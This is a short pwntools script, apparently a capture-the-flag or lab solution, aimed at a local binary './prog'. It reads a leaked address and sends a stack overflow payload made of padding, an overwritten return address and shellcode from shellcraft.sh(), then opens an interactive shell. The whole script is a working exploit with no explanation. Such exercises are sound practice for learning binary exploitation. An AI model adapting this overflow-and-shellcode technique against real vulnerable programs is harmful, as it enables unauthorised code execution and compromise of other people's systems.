from pwn import *

p = process('./prog')
context.clear(arch=p.elf.arch, endian=p.elf.endian)

p.readuntil('at')
addr = int(p.readline(), 0)

payload = 'A'*(1+context.bytes)
payload += pack(addr + len(payload) + context.bytes)
payload += asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
